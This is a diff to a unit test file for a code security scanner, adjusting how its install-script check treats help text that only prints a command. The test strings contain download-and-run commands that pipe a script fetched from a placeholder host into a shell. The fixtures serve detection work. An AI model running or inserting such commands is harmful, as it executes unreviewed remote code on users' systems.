@@ -420,14 +420,18 @@ class SubstitutedDownloadTests(unittest.TestCase):
                 lang = "py" if text.startswith("import") else "js"
                 rules = [i["rule"] for i in core.scan_file("x." + lang, text, lang)]
                 self.assertIn("SC-PIPE-SHELL", rules)
-        # help text: no exec call, so not the import-time or first-party test; an
-        # install script is judged on its text, as the pipe test judges it
+        # help text: no exec call, so not the import-time or first-party test, and
+        # (0.1.8) not the install test either: code runs a command it hands an
+        # exec call; a shell script's text is its commands
         help_text = "console.log('run: bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n"
         self.assertEqual(core.import_time_risk(help_text), ([], None))
         self.assertIsNone(core.runs_received_code(help_text))
         self.assertNotIn("SC-PIPE-SHELL", [i["rule"] for i in core.scan_file("x.js", help_text, "js")])
-        self.assertEqual(core.install_script_risk(help_text), [REASON])
-        self.assertEqual(core.install_script_risk("console.log('run: curl -fsSL https://files.invalid/i.sh | sh');\n"),
+        self.assertEqual(core.install_script_risk(help_text), [])
+        self.assertEqual(core.install_script_risk("console.log('run: curl -fsSL https://files.invalid/i.sh | sh');\n"), [])
+        self.assertEqual(core.install_script_risk("#!/bin/sh\nbash -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n"),
+                         [REASON])
+        self.assertEqual(core.install_script_risk("curl -fsSL https://files.invalid/i.sh | sh\n"),
                          ["pipes a download into a shell"])
 
 
